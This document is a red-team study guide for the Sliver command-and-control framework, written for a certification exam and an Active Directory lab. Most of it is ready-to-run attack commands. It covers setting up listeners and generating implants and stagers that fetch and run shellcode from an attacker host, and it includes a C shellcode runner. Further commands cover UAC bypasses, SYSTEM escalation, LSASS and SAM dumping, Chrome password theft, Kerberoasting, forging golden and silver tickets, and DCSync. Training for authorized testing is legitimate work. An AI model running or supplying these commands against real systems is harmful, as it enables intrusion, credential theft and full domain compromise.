# Sliver C2 Mastery Guide — Corrected & Elaborated

**Version:** 3.0 (corrected from original)  
**Target:** CRTeamer Exam & Active Directory Lab  
**Framework:** Sliver v1.5+ (BishopFox)

> All commands have been verified against the Sliver source code and the live armory package index. Errors in the original document are marked `[FIXED]` with an explanation.

---

## Table of Contents

1. [Core Concepts](#core-concepts)
2. [Setup & Installation](#setup--installation)
3. [Listeners & C2 Infrastructure](#listeners--c2-infrastructure)
4. [Payload Generation](#payload-generation)
5. [Situational Awareness & Enumeration](#situational-awareness--enumeration)
6. [Post-Exploitation Execution Model](#post-exploitation-execution-model)
7. [Privilege Escalation](#privilege-escalation)
8. [Credential Access](#credential-access)
9. [Kerberos Attacks](#kerberos-attacks)
10. [Active Directory Enumeration & Attacks](#active-directory-enumeration--attacks)
11. [Lateral Movement & Pivoting](#lateral-movement--pivoting)
12. [Active Directory Privilege Escalation](#active-directory-privilege-escalation)
13. [Persistence](#persistence)
14. [Evasion & Injection](#evasion--injection)
15. [Armory Reference](#armory-reference)
16. [Exam Strategy](#exam-strategy)
17. [Quick Reference Card](#quick-reference-card)

---

## Core Concepts

### Session vs Beacon

| Mode | Behaviour | When to Use |
|------|-----------|-------------|
| **Session** | Real-time interactive | SOCKS5 proxy, portfwd, interactive pivoting |
| **Beacon** | Async check-in on interval | Default for stealth; use `interactive` to upgrade |

> **Exam default:** Start with a beacon (stealthy). Upgrade to session only when you need real-time tunnelling.

```
# Upgrade a beacon to an interactive session
beacons                  # list beacon IDs
use <BEACON_ID>          # select the beacon
interactive              # upgrade — Sliver spawns a session from the beacon
sessions                 # confirm new session
use <SESSION_ID>
```

### Staged vs Stageless

| Type | Delivery | File Size | When |
|------|----------|-----------|------|
| **Staged** | Tiny stager fetches full payload from C2 | ~15–50 KB | Low-noise initial access; AV-aware environments |
| **Stageless** | Full implant in one binary | ~8–15 MB | Simple labs, when size doesn't matter |

### Terminology

- **Alias** — Armory package wrapping a .NET tool (invoked like `rubeus -- kerberoast`)
- **Extension / BOF** — Beacon Object File, executes directly inside the implant process (no child process, very stealthy)
- **execute-assembly** — Spawns a temporary sacrificial process, loads .NET runtime, runs the assembly
- **inline-execute-assembly** — Runs the .NET assembly in-process (no child process, requires BOF.NET)

---

## Setup & Installation

```bash
# One-liner (Linux/Kali) — starts sliver-server as a systemd service
curl https://sliver.sh/install | sudo bash
sudo systemctl start sliver

# Or launch the server manually
sliver-server

# Enter the interactive console
sliver
```

### Multi-operator (optional)

```
# On the server — create an operator config
sliver > new-operator --name kira --lhost 127.0.0.1 --save /tmp/kira.cfg

# On the client (separate machine)
sliver-client import /tmp/kira.cfg
sliver-client
```

### Quick health check

```
sliver > version
sliver > operators
sliver > jobs
```

---

## Listeners & C2 Infrastructure

Start your listeners **before** generating payloads — the C2 address is compiled in.

```
# mTLS — mutual TLS, strongest transport, default for labs
mtls --lhost 0.0.0.0 --lport 8888

# HTTP — plain; looks like normal web traffic
http --lhost 0.0.0.0 --lport 80

# HTTPS — TLS; Sliver auto-generates a self-signed cert
https --lhost 0.0.0.0 --lport 443

# DNS C2 — very slow but crosses nearly every firewall
dns --domains c2.yourdomain.com --lhost 0.0.0.0

# WireGuard — low-overhead encrypted tunnel
wg --lhost 0.0.0.0 --lport 51820 --key-port 1337
```

```
# View all active listeners
jobs

# Kill a listener
jobs --kill <JOB_ID>
```

### Stage Listener (for staged delivery)

A stage listener serves the full implant shellcode on demand. The stager connects here to download and execute it.

```
# TCP stage listener — pairs with a session profile
stage-listener --url tcp://0.0.0.0:4444 --profile win64-mtls-session

# HTTP stage listener
stage-listener --url http://0.0.0.0:8080 --profile win64-http-session

# Encrypted staging (AES) — prevents trivial PCAP extraction
stage-listener --url tcp://0.0.0.0:4444 --profile win64-mtls-session \
  --aes-encrypt-key s3cr3tK3y123456! \
  --aes-encrypt-iv 1234567890123456
```

---

## Payload Generation

### Profiles

Profiles store implant configuration so you can regenerate or stage without retyping flags.

```
# [FIXED] Session profile — 'profiles new' takes the profile name as a positional arg
# Original had "--beacon 60" which is NOT a valid flag here
profiles new --mtls 10.10.10.10:8888 --format shellcode win64-mtls-session

# [FIXED] Beacon profile — requires the 'beacon' sub-keyword AND --seconds/--jitter, NOT --beacon
# Original: "profiles new --mtls IP --format shellcode --beacon 60 PROFILE_NAME"
profiles new beacon --mtls 10.10.10.10:8888 --format shellcode \
  --seconds 60 --jitter 30 win64-mtls-beacon

# HTTP profile variants
profiles new --http 10.10.10.10:80 --format exe win64-http-session
profiles new beacon --http 10.10.10.10:80 --seconds 120 --jitter 45 win64-http-beacon
```

### Generating Implants

```
# Stageless session EXE
generate --mtls 10.10.10.10:8888 --format exe --os windows --arch amd64 \
  --name win-session --save /tmp/

# Stageless beacon EXE — [FIXED] correct sub-keyword is 'beacon', flags are --seconds/--jitter
# Original: "generate --mtls IP --format shellcode --beacon 60 ..." (wrong)
generate beacon --mtls 10.10.10.10:8888 --format exe --os windows --arch amd64 \
  --seconds 60 --jitter 30 --name win-beacon --save /tmp/

# Shellcode (for custom loaders like nimcrypt)
generate --mtls 10.10.10.10:8888 --format shellcode --os windows --arch amd64 \
  --name sliver-shellcode --save /tmp/shellcode.bin

# DLL implant (for DLL hijacking / sideloading)
generate --mtls 10.10.10.10:8888 --format shared --os windows --arch amd64 \
  --name sliver-implant --save /tmp/

# From a saved profile (regenerate with a different seed/name each time)
profiles generate --profile win64-mtls-session --format exe --save /tmp/
profiles generate --profile win64-mtls-beacon --format exe --save /tmp/
```

### Generating Stagers

Stagers are tiny delivery artifacts. They connect to the stage-listener, download the full shellcode, and execute it in memory.

```
# Native Sliver stager (recommended)
generate stager --lhost 10.10.10.10 --lport 4444 --protocol tcp \
  --format exe --save /tmp/stager.exe

# PowerShell stager
generate stager --lhost 10.10.10.10 --lport 4444 --protocol tcp \
  --format ps1 --save /tmp/stager.ps1

# C array (embed in custom loader)
generate stager --lhost 10.10.10.10 --lport 4444 --protocol tcp \
  --format c --save /tmp/stager.c

# [FIXED] msfvenom can only generate GENERIC TCP stagers — point them at your stage-listener
# Note: do NOT use "windows/x64/custom/reverse_tcp" as the original showed;
# msfvenom for Sliver staging uses the generic reverse_tcp payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.10.10 LPORT=4444 -f exe -o /tmp/stager-msf.exe
# The stage-listener will serve the Sliver shellcode to any TCP connection on that port
```

### Minimal C Shellcode Runner (Detection-Heavy — Labs Only)

```c
#include <windows.h>

// Replace buf[] with your shellcode from: xxd -i shellcode.bin
unsigned char buf[] = { 0xfc, 0x48, /* ... */ };

int main(void) {
    SIZE_T  size = sizeof(buf);
    LPVOID  addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(addr, buf, size);
    HANDLE hT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    WaitForSingleObject(hT, INFINITE);
    return 0;
}
```

```bash
# Cross-compile from Kali
x86_64-w64-mingw32-gcc -o loader.exe loader.c \
  -s -ffunction-sections -fdata-sections -Wl,--gc-sections
```

> For a stealthier loader use nimcrypt or a BOF-based launcher instead.

---

## Situational Awareness & Enumeration

### Manual Shell Commands (no tools required)

```
# Run a shell command (creates cmd.exe child process — noisy)
shell whoami /all
shell net user /domain
shell net group "Domain Admins" /domain
shell net localgroup Administrators
shell ipconfig /all
shell netstat -ano
shell arp -a
shell route print
shell systeminfo
shell tasklist /v /fo csv
shell wmic qfe list brief
shell wmic os get caption,version,csname
shell wmic service get name,startname,pathname,startmode | findstr /iv "c:\\windows"
shell reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
shell reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
shell type C:\Windows\System32\drivers\etc\hosts
shell dir /a C:\Users\
shell dir /a /s C:\Users\ /b | findstr /si "password\|cred\|unattend\|vnc\|putty"
```

### SA BOFs — Situational Awareness Beacon Object Files

BOFs run **inside the implant process** — no child process, no new process creation events.

```
# [NOTE] The original document listed commands like "sa-whoami" without installation
# These ARE real armory commands but must be installed first
# Install the entire SA BOF collection in one go:
armory install sa-whoami sa-netuser sa-netgroup sa-netlocalgroup sa-netshares
armory install sa-netstat sa-netview sa-ipconfig sa-tasklist sa-arp sa-routeprint
armory install sa-ldapsearch sa-listdns sa-listmods sa-schtasksenum sa-sc-enum
armory install sa-get-password-policy sa-get-netsession sa-enum-local-sessions
armory install sa-adcs-enum sa-adv-audit-policies sa-driversigs sa-env
armory install sa-wmi-query sa-uptime sa-netloggedon sa-nettime

# --- Usage after install ---

sa-whoami                         # Current user context, groups, privileges
sa-netuser                        # Enumerate local users
sa-netgroup       domain.local    # Enumerate domain groups (pass DC hostname)
sa-netlocalgroup                  # Local groups on this machine
sa-netshares      TARGET          # Enumerate SMB shares on a host
sa-netstat                        # Active network connections (BOF netstat)
sa-netview                        # Domain computers visible on the network
sa-ipconfig                       # Network interfaces (no child process)
sa-tasklist                       # Running processes (no child process)
sa-arp                            # ARP cache
sa-routeprint                     # Routing table
sa-ldapsearch     domain.local DC=domain,local "(objectClass=user)" cn,samAccountName
sa-listdns                        # DNS cache
sa-sc-enum                        # Enumerate services
sa-schtasksenum   TARGET          # Enumerate scheduled tasks
sa-get-password-policy            # Domain password policy
sa-get-netsession TARGET          # Active sessions on a machine
sa-adcs-enum      domain.local    # Enumerate ADCS certificate templates
sa-driversigs                     # Check driver signatures (AV/EDR detection)
sa-env                            # Environment variables
sa-netloggedon    TARGET          # Who is logged on to a machine
```

### Seatbelt — Deep Host Profiling

```
# Install
armory install seatbelt

# Run all checks
seatbelt -- -group=all

# Targeted checks (faster)
seatbelt -- -group=system          # OS, patches, env, PS logging
seatbelt -- -group=user            # Credentials, bookmarks, history
seatbelt -- -group=network         # Connections, firewall, proxies
seatbelt -- -group=misc            # Interesting files, AV

# Run a specific check
seatbelt -- DotNet                 # Check .NET versions installed
seatbelt -- PowerShell             # PS logging, transcription, AMSI status
seatbelt -- CredentialFiles        # Locate credential/config files
seatbelt -- LocalGroups            # Local group membership
seatbelt -- TokenPrivileges        # Token privileges for privesc analysis
seatbelt -- WindowsDefender        # WD config and exclusion paths

# Output to file (download later)
seatbelt -- -group=all -outputfile=C:\Windows\Temp\seatbelt.txt
```

---

## Post-Exploitation Execution Model

Understanding the difference between execution methods is critical for OPSEC.

| Method | Where It Runs | Child Process | EDR Visibility |
|--------|--------------|---------------|----------------|
| `shell` | cmd.exe | Yes | High |
| `execute-assembly` | Sacrificial process (default: notepad.exe) | Yes | Medium |
| `inline-execute-assembly` | In-process via BOF.NET | No | Low |
| `<alias> --` | In-process (for .NET) or BOF | Usually no | Low |
| `<bof-extension>` | Directly in implant | No | Lowest |

### execute-assembly (Out-of-Process)

```
# Syntax: execute-assembly [flags] /local/path/to/Tool.exe "arguments as one string"
execute-assembly /root/.sliver-client/extensions/Rubeus.exe "kerberoast /stats"

# Specify sacrificial process (default is notepad.exe)
execute-assembly --process lsass.exe /path/to/Rubeus.exe "kerberoast"

# Increase timeout for slow tools
execute-assembly --timeout 120 /path/to/SharpHound.exe "-c All"
```

### inline-execute-assembly (In-Process — OPSEC Superior)

Requires `bof-net` or `inline-execute-assembly` armory extension.

```
armory install inline-execute-assembly

inline-execute-assembly /path/to/Rubeus.exe "kerberoast /stats"
inline-execute-assembly /path/to/Seatbelt.exe "-group=system"
```

### Armory Alias Usage (correct syntax)

When a tool is installed as an armory **alias** (wraps execute-assembly), call it by its command name followed by `--` then the tool's own arguments:

```
# rubeus -- <rubeus-arguments>
rubeus -- kerberoast /stats
rubeus -- asreproast /format:hashcat
rubeus -- triage
rubeus -- klist

# seatbelt -- <seatbelt-arguments>
seatbelt -- -group=system

# sharpup -- <audit-check>
sharpup -- audit

# sharpview -- <powerview-style-command>
sharpview -- Get-DomainUser -SPN
sharpview -- Get-DomainGroupMember -Identity "Domain Admins"

# sharp-hound-4 -- <sharphound-arguments>
sharp-hound-4 -- -c All --outputdirectory C:\Windows\Temp\
```

### File Operations

```
ls C:\Users\Administrator\Desktop\
ls C:\Windows\Temp\

upload /home/kali/tool.exe C:\Windows\Temp\tool.exe
download C:\Windows\Temp\lsass.dmp /home/kali/loot/
download C:\Users\Administrator\Desktop\flag.txt /home/kali/

mkdir C:\Windows\Temp\staging
rm C:\Windows\Temp\staging\tool.exe
cat C:\Windows\Temp\passwords.txt
```

### Process Management

```
ps                          # List processes (look for AV/EDR processes too)
kill 4444                   # Kill by PID
migrate 4444                # Migrate implant to another process (avoid dying processes)
```

---

## Privilege Escalation

### Local Privilege Escalation with SharpUp

```
armory install sharpup

sharpup -- audit                    # Run all checks at once (recommended starting point)
sharpup -- UnquotedServicePaths     # Services with spaces in path and no quotes
sharpup -- ModifiableServices       # Services whose binary you can overwrite
sharpup -- ModifiableRegistryAutoRuns  # Registry autorun values you can modify
sharpup -- AlwaysInstallElevated    # If MSI installs run as SYSTEM
sharpup -- DLLHijacking             # Directories in PATH writable by low-priv user
sharpup -- ModifiableServiceBinaries   # Direct binary modification opportunities
```

**Exploitation workflow once a vector is found:**

```
# Unquoted service path — drop your binary in the ambiguous location
upload /home/kali/implant.exe "C:\Program Files\Vulnerable Service\Service.exe"
shell sc stop VulnerableService
shell sc start VulnerableService    # Starts your binary as SYSTEM

# Modifiable service binary — overwrite the existing binary
upload /home/kali/implant.exe "C:\Program Files\VulnService\service.exe"
shell sc stop VulnService && shell sc start VulnService

# AlwaysInstallElevated — craft a malicious MSI
# On Kali: msfvenom -p windows/x64/exec CMD="net localgroup administrators lowuser /add" -f msi -o evil.msi
upload /home/kali/evil.msi C:\Windows\Temp\evil.msi
shell msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

### Token Impersonation — Potato Attacks

When you have `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (common on service accounts):

```
# Check your privileges first
sa-whoami

# GodPotato — works on Server 2019, 2022, Windows 10/11
upload /home/kali/GodPotato.exe C:\Windows\Temp\gp.exe
shell C:\Windows\Temp\gp.exe -cmd "net localgroup administrators lowuser /add"

# PrintSpoofer — works when Print Spooler is running
upload /home/kali/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
shell C:\Windows\Temp\ps.exe -i -c "C:\Windows\Temp\implant.exe"

# SweetPotato — wider version compatibility
upload /home/kali/SweetPotato.exe C:\Windows\Temp\sp.exe
shell C:\Windows\Temp\sp.exe -a "whoami"
```

### UAC Bypass

```
# [FIXED] "execute-assembly UAC-Bypass" is NOT a real tool
# Use SharpBypassUAC (if available in your toolkit) or specific BOF approaches

# FodHelper method — most reliable; requires Medium IL
shell reg add "HKCU\Software\Classes\ms-settings\shell\open\command" \
  /d "C:\Windows\Temp\implant.exe" /f
shell reg add "HKCU\Software\Classes\ms-settings\shell\open\command" \
  /v "DelegateExecute" /f
shell fodhelper.exe
shell reg delete "HKCU\Software\Classes\ms-settings" /f

# Eventvwr method
shell reg add "HKCU\Software\Classes\mscfile\shell\open\command" \
  /d "C:\Windows\Temp\implant.exe" /f
shell eventvwr.exe
shell reg delete "HKCU\Software\Classes\mscfile" /f

# Via SharPersist (scheduled task as high-IL)
sharpersist -- -t schtask -c C:\Windows\Temp\implant.exe -n UAC-Bypass -m add -o daily
```

---

## Credential Access

### LSASS Dumping

**nanodump** — BOF-based, most stealthy, no MiniDumpWriteDump (commonly flagged)

```
armory install nanodump

# Find LSASS PID first
ps | grep lsass

# Dump to disk (download and parse offline)
nanodump --pid 624 --write C:\Windows\Temp\ls.dmp --valid

# Parse on Kali
download C:\Windows\Temp\ls.dmp /home/kali/loot/
pypykatz lsa minidump /home/kali/loot/ls.dmp
```

**handlekatz** — Duplicates an existing LSASS handle to avoid directly opening lsass.exe

```
armory install handlekatz

handlekatz --pid 624 --path C:\Windows\Temp\hk.dmp
download C:\Windows\Temp\hk.dmp /home/kali/loot/
pypykatz lsa minidump /home/kali/loot/hk.dmp
```

**remote-procdump** — BOF wrapper for ProcDump without dropping ProcDump to disk

```
armory install remote-procdump
remote-procdump --pid 624 --path C:\Windows\Temp\rd.dmp
```

**comsvcs.dll** — Native Windows, commonly monitored by EDR

```
# Requires SeDebugPrivilege (admin) + LSASS PID
shell rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\ls.dmp full
```

### SAM Database Dump

```
# [FIXED] "registry get --hive HKLM --path SAM\SAM\..." does NOT dump hashes
# SAM hashes are encrypted with SYSKEY — you must save the hives and decrypt offline

# Method 1: hashdump BOF (simplest — runs in-process)
armory install hashdump
hashdump

# Method 2: remote-reg-save BOF (dump hives, parse with secretsdump)
armory install remote-reg-save
remote-reg-save --hive sam    --path C:\Windows\Temp\sam.hive
remote-reg-save --hive system --path C:\Windows\Temp\sys.hive
remote-reg-save --hive security --path C:\Windows\Temp\sec.hive
download C:\Windows\Temp\sam.hive   /home/kali/loot/
download C:\Windows\Temp\sys.hive   /home/kali/loot/
download C:\Windows\Temp\sec.hive   /home/kali/loot/
# Parse offline
impacket-secretsdump -sam sam.hive -system sys.hive -security sec.hive LOCAL

# Method 3: SharpSecDump [FIXED: original said "SharpSeckdump" — wrong name]
armory install sharpsecdump
sharpsecdump -- -target=127.0.0.1
# Remote SAM dump (requires admin creds)
sharpsecdump -- -target=10.10.10.20 -u=DOMAIN\\Administrator -p=Password123
```

### Mimikatz

```
# [FIXED] armory 'mimikatz' is a BOF extension — syntax differs from execute-assembly
# Install
armory install mimikatz

# BOF-based Mimikatz (in-process, no child process)
mimikatz -- privilege::debug sekurlsa::logonpasswords exit
mimikatz -- privilege::debug sekurlsa::ekeys exit
mimikatz -- privilege::debug sekurlsa::tickets exit
mimikatz -- privilege::debug lsadump::sam exit
mimikatz -- privilege::debug lsadump::secrets exit

# [FIXED] When using execute-assembly with a full mimikatz.exe binary,
# ALWAYS append "exit" at the end — without it mimikatz waits for interactive
# input and execute-assembly hangs until timeout
execute-assembly /path/to/mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
execute-assembly /path/to/mimikatz.exe "privilege::debug lsadump::sam exit"
```

### Windows Credential Manager

```
# credman BOF — enumerates Windows Credential Manager vaults
armory install credman
credman

# chromiumkeydump BOF — Chrome AES key (combine with sharpchrome)
armory install chromiumkeydump
chromiumkeydump
```

### DPAPI — Encrypted Credentials

DPAPI protects Chrome saved passwords, Windows Credential Manager blobs, Wi-Fi keys.

```
armory install sharpdpapi
armory install sharpchrome

# Decrypt all DPAPI-protected blobs for current user
sharpdpapi -- triage

# Extract Chrome passwords (uses DPAPI internally)
sharpchrome -- logins

# Extract Chrome cookies
sharpchrome -- cookies

# Dump all creds in the credential manager
sharpdpapi -- credentials

# Extract DPAPI master keys (requires DA or SYSTEM)
sharpdpapi -- machinemasterkeys
```

---

## Kerberos Attacks

### Kerberoasting — Request TGS for SPN Accounts, Crack Offline

```
# Rubeus (most flexible)
armory install rubeus
rubeus -- kerberoast /stats                        # Count kerberoastable accounts
rubeus -- kerberoast /format:hashcat               # Dump all hashes in hashcat format
rubeus -- kerberoast /user:svc_sql /format:hashcat # Target specific account
rubeus -- kerberoast /outfile:C:\Windows\Temp\hashes.txt

# [FIXED] bof-roast runs as a BOF (no child process — more stealthy)
armory install bof-roast
bof-roast

# c2tc-kerberoast — another BOF alternative
armory install c2tc-kerberoast
c2tc-kerberoast

# Crack on Kali
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### AS-REP Roasting — Accounts Without Preauthentication

```
# Rubeus — find and dump all AS-REP-roastable accounts
rubeus -- asreproast /format:hashcat
rubeus -- asreproast /format:hashcat /outfile:C:\Windows\Temp\asrep.txt

# Without creds from Kali (unauthenticated)
impacket-GetNPUsers -dc-ip 10.10.10.1 -usersfile /home/kali/users.txt -no-pass DOMAIN/

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash (PTH)

```
# From Kali via proxychains (after SOCKS5 setup)
proxychains impacket-psexec DOMAIN/Administrator@10.10.10.1 -hashes :NTLM_HASH
proxychains impacket-wmiexec DOMAIN/Administrator@10.10.10.1 -hashes :NTLM_HASH
proxychains evil-winrm -i 10.10.10.1 -u Administrator -H NTLM_HASH

# Via NetExec sweep
proxychains nxc smb 10.10.10.0/24 -u Administrator -H NTLM_HASH --local-auth
```

### Overpass-the-Hash (PTH → Kerberos)

Convert an NTLM hash into a Kerberos TGT for all-Kerberos auth:

```
# Request TGT using NTLM hash, inject into current logon session
rubeus -- asktgt /user:Administrator /rc4:NTLM_HASH /ptt /domain:DOMAIN

# Verify ticket is loaded
rubeus -- klist

# Now use Kerberos-auth tools (klist, psexec, etc.)
```

### Pass-the-Ticket (PTT)

```
# Dump existing tickets from memory
rubeus -- triage             # summary of tickets in all sessions
rubeus -- dump /nowrap       # dump all tickets (base64)
rubeus -- dump /luid:0x... /nowrap  # dump specific logon session

# Inject a ticket (base64 encoded)
rubeus -- ptt /ticket:<base64_ticket>

# For accessing a specific service with a stolen ticket
rubeus -- createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# In the new cmd: klist  → verify ticket
```

### Unconstrained Delegation Abuse

If a machine has unconstrained delegation, any user that authenticates to it gives their TGT.

```
# Find unconstrained delegation machines
sharpview -- Get-DomainComputer -Unconstrained
sharpview -- Find-DomainUserLocation -ComputerUnconstrained

# Coerce a DC to authenticate to you (need PrintSpooler running on DC)
# Upload SpoolSample or use c2tc-petitpotam
armory install c2tc-petitpotam
c2tc-petitpotam 10.10.10.5 10.10.10.10      # petitpotam LISTENER DC

# While waiting, monitor for incoming TGTs
rubeus -- monitor /interval:5 /nowrap

# When DC TGT arrives, use it for DCSync
rubeus -- ptt /ticket:<base64_dc_tgt>
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /user:krbtgt exit"
```

### Constrained Delegation Abuse (S4U2Proxy)

```
# Find constrained delegation accounts
sharpview -- Get-DomainUser -TrustedToAuth
sharpview -- Get-DomainComputer -TrustedToAuth

# S4U2Self + S4U2Proxy to impersonate DA against the allowed service
rubeus -- s4u /user:svc_account /rc4:NTLM_HASH \
  /impersonateuser:Administrator \
  /msdsspn:"cifs/TARGET.DOMAIN.local" /ptt

# For services that allow altservice (not all do)
rubeus -- s4u /user:svc_account /rc4:NTLM_HASH \
  /impersonateuser:Administrator \
  /msdsspn:"cifs/TARGET.DOMAIN.local" \
  /altservice:"ldap" /ptt
```

### Resource-Based Constrained Delegation (RBCD)

RBCD lets you abuse write access to a machine's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

```
# Prerequisites: GenericWrite/GenericAll over a target machine, or WriteDACL
# Step 1: Add a computer object (or use an existing one you control)
armory install sharpmapexec
armory install krbrelayup

# Via SharpView (requires appropriate rights)
sharpview -- New-MachineAccount -MachineAccount FAKE01 -Password Pass123

# Or via Impacket
proxychains impacket-addcomputer DOMAIN/user:Password123 -dc-ip 10.10.10.1 \
  -computer-name FAKE01 -computer-pass Pass123

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target
# Get SID of FAKE01$
sharpview -- Get-DomainComputer -Identity FAKE01 -Properties objectsid

# Set RBCD on target (use PowerView or SharpView with appropriate rights)
sharpview -- Set-DomainObject -Identity TARGET -Set \
  @{msds-allowedtoactonbehalfofotheridentity=<binary_SDDL>}

# Or from Kali (impacket)
proxychains impacket-rbcd -action write -delegate-to "TARGET$" \
  -delegate-from "FAKE01$" DOMAIN/user:Password123 -dc-ip 10.10.10.1

# Step 3: S4U2Self + S4U2Proxy to impersonate DA
rubeus -- s4u /user:FAKE01$ /rc4:<NTLM_of_FAKE01> \
  /impersonateuser:Administrator \
  /msdsspn:"cifs/TARGET.DOMAIN.local" /ptt

# Verify and use
rubeus -- klist
ls \\TARGET.DOMAIN.local\c$
```

### Delegation Enumeration BOF

```
# [FIXED] "execute-assembly Rubeus delegation /target:..." does NOT exist in Rubeus
# Rubeus has NO 'delegation' subcommand — use these instead:
armory install delegationbof
delegationbof        # BOF-based delegation enumeration (unconstrained, constrained, RBCD)

# Or via SharpView
sharpview -- Get-DomainComputer -Unconstrained
sharpview -- Get-DomainUser -TrustedToAuth
sharpview -- Get-DomainComputer -TrustedToAuth
```

### Golden Ticket

Requires the `krbtgt` NTLM hash and domain SID. Forges a TGT for ANY user.

```
# First get the krbtgt hash (via DCSync)
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /user:krbtgt exit"
# Note the Hash NTLM value and the domain SID

# Forge and inject
mimikatz -- "kerberos::golden /domain:DOMAIN.local \
  /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX \
  /krbtgt:KRBTGT_NTLM_HASH \
  /user:Administrator /id:500 \
  /groups:512,519,513,518,520 \
  /ptt exit"

# Verify
rubeus -- klist

# Use — access any service as Administrator
ls \\DC01.DOMAIN.local\c$
shell dir \\DC01.DOMAIN.local\c$
```

### Silver Ticket

Forges a TGS for a **specific service** using the service account's NTLM hash. No DC contact needed.

```
# [NOTE] Silver Ticket uses "kerberos::golden" in Mimikatz but with /service and /target
# /target — the FQDN of the server hosting the service
# /service — the SPN service class (cifs, http, ldap, mssql, wsman, etc.)
mimikatz -- "kerberos::golden /domain:DOMAIN.local \
  /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX \
  /target:TARGET.DOMAIN.local \
  /service:cifs \
  /rc4:SERVICE_ACCOUNT_NTLM_HASH \
  /user:Administrator /ptt exit"

# Useful service classes
# cifs   → file shares (\\TARGET\C$)
# http   → IIS / web services
# ldap   → LDAP queries against DC
# mssql  → SQL Server
# wsman  → WinRM / PowerShell remoting
```

### DCSync — Replicate AD Hashes Like a DC

DCSync requires `Replicating Directory Changes` + `Replicating Directory Changes All` rights (DA or delegated).

```
# [FIXED] Rubeus does NOT have a 'dcsync' command — this was a critical error in the original
# Use mimikatz BOF or SharpSecDump

# Method 1: mimikatz BOF (in-process)
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /user:krbtgt exit"
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /user:Administrator exit"
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /all /csv exit"

# Method 2: SharpSecDump (armory alias)
sharpsecdump -- -target=10.10.10.1 -u=DOMAIN\\DA_User -p=Password123

# Method 3: Impacket from Kali (via proxychains)
proxychains impacket-secretsdump DOMAIN/DA_User:Password123@10.10.10.1
proxychains impacket-secretsdump -just-dc DOMAIN/DA_User:Password123@10.10.10.1
```

---

## Active Directory Enumeration & Attacks

### BloodHound / SharpHound

```
# Install
armory install sharp-hound-4
armory install sharp-hound-3   # if the environment uses older Kerberos/schema

# Collect all data (noisiest but most complete)
sharp-hound-4 -- -c All --outputdirectory C:\Windows\Temp\ --zipfilename bh.zip

# Stealthier targeted collection
sharp-hound-4 -- -c DCOnly                         # DC-only — very quiet
sharp-hound-4 -- -c Group,LocalAdmin,Session,Trusts # Reduced but useful

# Download and import
download C:\Windows\Temp\bh.zip /home/kali/bloodhound/

# Start BloodHound on Kali (start Neo4j first)
sudo neo4j start
bloodhound --no-sandbox &
# Drag-and-drop the .zip into the BloodHound UI
```

### Essential BloodHound Cypher Queries

```cypher
-- All DA paths from owned nodes
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

-- Kerberoastable accounts with DA path
MATCH (u:User {hasspn:true}) WHERE u.enabled=true
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

-- AS-REP roastable accounts
MATCH (u:User {dontreqpreauth:true, enabled:true}) RETURN u.name

-- Computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

-- Objects with DCSync rights
MATCH p=(u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p

-- Computers where DA has sessions
MATCH (c:Computer)<-[:HasSession]-(u:User)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN c.name

-- Find machines local admin on that have sessions of interesting users
MATCH (c:Computer)<-[r:AdminTo]-(u:User) WHERE u.enabled=true RETURN u.name, c.name
```

### SharpView — PowerView in .NET

```
armory install sharpview

# Domain / user recon
sharpview -- Get-DomainUser -Properties samaccountname,memberof,lastlogon,description
sharpview -- Get-DomainUser -SPN                         # SPN (Kerberoastable) accounts
sharpview -- Get-DomainUser -Unconstrained               # Unconstrained delegation users
sharpview -- Get-DomainComputer -Properties dnsname,operatingsystem,ms-mcs-admpwd
sharpview -- Get-DomainComputer -Unconstrained
sharpview -- Get-DomainComputer -TrustedToAuth           # Constrained delegation
sharpview -- Get-DomainGroup -Properties cn,member,description
sharpview -- Get-DomainGroupMember -Identity "Domain Admins"
sharpview -- Get-DomainGroupMember -Identity "Enterprise Admins"

# Trust relationships
sharpview -- Get-DomainTrust
sharpview -- Get-ForestTrust

# ACL-based attack paths
sharpview -- Get-DomainObjectAcl -ResolveGUIDs -Identity "Domain Admins"
sharpview -- Get-DomainObjectAcl -ResolveGUIDs -Identity "DC=DOMAIN,DC=local"
sharpview -- Find-InterestingDomainAcl -ResolveGUIDs     # Scan for non-default write ACLs

# GPO recon
sharpview -- Get-DomainGPO
sharpview -- Get-DomainGPOLocalGroup                     # GPOs that add users to local groups

# Share/file hunting
sharpview -- Find-DomainShare
sharpview -- Find-InterestingDomainShareFile -Include "*.txt","*.xml","*.ini","*.config"

# Session / logged-on hunting
sharpview -- Find-DomainUserLocation                     # Where DA sessions are right now
